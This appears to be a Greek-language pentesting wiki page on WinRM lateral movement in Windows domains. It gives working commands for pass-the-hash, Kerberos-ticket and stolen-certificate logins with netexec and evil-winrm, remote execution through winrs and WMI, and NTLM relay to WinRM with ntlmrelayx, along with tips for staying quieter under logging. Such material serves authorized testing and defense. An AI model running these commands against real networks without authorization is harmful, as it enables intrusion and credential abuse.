# WinRM

{{#include ../../banners/hacktricks-training.md}}

Το WinRM είναι ένα από τα πιο βολικά transports **lateral movement** σε περιβάλλοντα Windows, επειδή σου δίνει ένα remote shell μέσω **WS-Man/HTTP(S)** χωρίς να χρειάζονται τα SMB service creation tricks. Αν ο στόχος εκθέτει **5985/5986** και το principal σου επιτρέπεται να χρησιμοποιήσει remoting, συχνά μπορείς να περάσεις από "valid creds" σε "interactive shell" πολύ γρήγορα.

Για το **protocol/service enumeration**, listeners, ενεργοποίηση WinRM, `Invoke-Command`, και γενική χρήση client, δες:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Χρησιμοποιεί **HTTP/HTTPS** αντί για SMB/RPC, οπότε συχνά δουλεύει εκεί όπου το PsExec-style execution μπλοκάρεται.
- Με **Kerberos**, αποφεύγει να στέλνει reusable credentials στον στόχο.
- Δουλεύει καθαρά από **Windows**, **Linux**, και **Python** tooling (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Το interactive PowerShell remoting path εκκινεί το **`wsmprovhost.exe`** στον στόχο μέσα στο context του authenticated user, κάτι που λειτουργικά διαφέρει από service-based exec.

## Access model and prerequisites

Στην πράξη, το επιτυχημένο WinRM lateral movement εξαρτάται από **τρία** πράγματα:

1. Ο στόχος έχει ένα **WinRM listener** (`5985`/`5986`) και firewall rules που επιτρέπουν πρόσβαση.
2. Το account μπορεί να **authenticate** στο endpoint.
3. Το account επιτρέπεται να **open a remoting session**.

Συνηθισμένοι τρόποι για να αποκτήσεις αυτή την πρόσβαση:

- **Local Administrator** στον στόχο.
- Membership στο **Remote Management Users** σε νεότερα συστήματα ή στο **WinRMRemoteWMIUsers__** σε συστήματα/components που ακόμα τιμούν αυτό το group.
- Explicit remoting rights που έχουν δοθεί μέσω local security descriptors / PowerShell remoting ACL changes.

Αν ήδη ελέγχεις ένα box με admin rights, θυμήσου ότι μπορείς επίσης να **delegate WinRM access χωρίς full admin group membership** χρησιμοποιώντας τις τεχνικές που περιγράφονται εδώ:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- Το **Kerberos απαιτεί hostname/FQDN**. Αν συνδεθείς με IP, ο client συνήθως κάνει fallback σε **NTLM/Negotiate**.
- Σε **workgroup** ή cross-trust edge cases, το NTLM συνήθως απαιτεί είτε **HTTPS** είτε το target να προστεθεί στα **TrustedHosts** στον client.
- Με **local accounts** μέσω Negotiate σε workgroup, οι UAC remote restrictions μπορεί να εμποδίσουν την πρόσβαση εκτός αν χρησιμοποιηθεί το built-in Administrator account ή `LocalAccountTokenFilterPolicy=1`.
- Το PowerShell remoting κάνει default στο **`HTTP/<host>` SPN**. Σε περιβάλλοντα όπου το `HTTP/<host>` είναι ήδη registered σε κάποιο άλλο service account, το WinRM Kerberos μπορεί να αποτύχει με `0x80090322`; χρησιμοποίησε ένα port-qualified SPN ή κάνε switch σε **`WSMAN/<host>`** όπου υπάρχει αυτό το SPN.

Αν πάρεις valid credentials κατά το password spraying, το να τα validate-άρεις μέσω WinRM είναι συχνά ο πιο γρήγορος τρόπος για να δεις αν μεταφράζονται σε shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec για validation και one-shot execution
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM για διαδραστικά shells

Το `evil-winrm` παραμένει η πιο βολική διαδραστική επιλογή από Linux επειδή υποστηρίζει **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, μεταφορά αρχείων και φόρτωση PowerShell/.NET στη μνήμη.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos SPN edge case: `HTTP` vs `WSMAN`

Όταν το προεπιλεγμένο **`HTTP/<host>`** SPN προκαλεί αποτυχίες του Kerberos, δοκιμάστε να ζητήσετε/χρησιμοποιήσετε ένα ticket **`WSMAN/<host>`** αντί για αυτό. Αυτό εμφανίζεται σε hardened ή περίεργα enterprise setups όπου το **`HTTP/<host>`** είναι ήδη συνδεδεμένο σε άλλο service account.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Αυτό είναι επίσης χρήσιμο μετά από κατάχρηση **RBCD / S4U** όταν ειδικά παραποιήσατε ή ζητήσατε ένα ticket υπηρεσίας **WSMAN** αντί για ένα γενικό `HTTP` ticket.

### Πιστοποίηση βάσει πιστοποιητικού

Το WinRM υποστηρίζει επίσης **client certificate authentication**, αλλά το πιστοποιητικό πρέπει να είναι mapped στον στόχο σε έναν **local account**. Από επιθετική σκοπιά, αυτό έχει σημασία όταν:

- έχετε κλέψει/εξαγάγει ένα έγκυρο client certificate και private key που είναι ήδη mapped για WinRM;
- έχετε κάνει κατάχρηση του **AD CS / Pass-the-Certificate** για να αποκτήσετε ένα certificate για έναν principal και έπειτα να pivot σε ένα άλλο authentication path;
- λειτουργείτε σε περιβάλλοντα που αποφεύγουν σκόπιμα το password-based remoting.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM είναι πολύ λιγότερο συνηθισμένο από το password/hash/Kerberos auth, αλλά όταν υπάρχει μπορεί να προσφέρει μια **passwordless lateral movement** διαδρομή που επιβιώνει από το password rotation.

### Python / automation με `pypsrp`

Αν χρειάζεσαι automation αντί για operator shell, το `pypsrp` σου δίνει WinRM/PSRP από Python με υποστήριξη για **NTLM**, **certificate auth**, **Kerberos**, και **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Windows-native WinRM lateral movement

### `winrs.exe`

Το `winrs.exe` είναι ενσωματωμένο και χρήσιμο όταν θέλετε **native WinRM εκτέλεση εντολών** χωρίς να ανοίξετε μια διαδραστική PowerShell remoting session:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Λειτουργικά, το `winrs.exe` συνήθως καταλήγει σε μια αλυσίδα απομακρυσμένων διεργασιών παρόμοια με:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Αυτό αξίζει να το θυμάστε, γιατί διαφέρει από το service-based exec και από τα διαδραστικά PSRP sessions.

### `winrm.cmd` / WS-Man COM αντί για PowerShell remoting

Μπορείτε επίσης να εκτελέσετε μέσω **WinRM transport** χωρίς `Enter-PSSession` καλώντας WMI classes πάνω από WS-Man. Αυτό διατηρεί το transport ως WinRM ενώ το απομακρυσμένο execution primitive γίνεται **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Αυτή η προσέγγιση είναι χρήσιμη όταν:

- Το PowerShell logging παρακολουθείται έντονα.
- Θέλεις **WinRM transport** αλλά όχι ένα κλασικό PS remoting workflow.
- Φτιάχνεις ή χρησιμοποιείς custom tooling γύρω από το **`WSMan.Automation`** COM object.

## NTLM relay to WinRM (WS-Man)

Όταν το SMB relay μπλοκάρεται από signing και το LDAP relay είναι περιορισμένο, το **WS-Man/WinRM** μπορεί ακόμα να είναι ένας ελκυστικός relay target. Το σύγχρονο `ntlmrelayx.py` περιλαμβάνει **WinRM relay servers** και μπορεί να κάνει relay σε targets **`wsman://`** ή **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Δύο πρακτικές σημειώσεις:

- Το Relay είναι πιο χρήσιμο όταν ο στόχος δέχεται **NTLM** και το relayed principal επιτρέπεται να χρησιμοποιήσει WinRM.
- Πρόσφατος κώδικας του Impacket χειρίζεται ειδικά αιτήματα **`WSMANIDENTIFY: unauthenticated`**, ώστε τα probes τύπου `Test-WSMan` να μην σπάνε τη ροή του relay.

Για περιορισμούς multi-hop μετά από την απόκτηση μιας πρώτης WinRM session, έλεγξε:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Σημειώσεις OPSEC και detection

- Το **interactive PowerShell remoting** συνήθως δημιουργεί **`wsmprovhost.exe`** στον στόχο.
- Το **`winrs.exe`** συνήθως δημιουργεί **`winrshost.exe`** και μετά το ζητούμενο child process.
- Να περιμένεις telemetry για **network logon**, WinRM service events, και PowerShell operational/script-block logging αν χρησιμοποιείς PSRP αντί για raw `cmd.exe`.
- Αν χρειάζεσαι μόνο μία εντολή, το `winrs.exe` ή η one-shot εκτέλεση μέσω WinRM μπορεί να είναι πιο ήσυχα από μια μακρόβια interactive remoting session.
- Αν το Kerberos είναι διαθέσιμο, προτίμησε **FQDN + Kerberos** αντί για IP + NTLM για να μειώσεις τόσο τα trust issues όσο και τις άβολες αλλαγές στο client-side `TrustedHosts`.

## Αναφορές

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
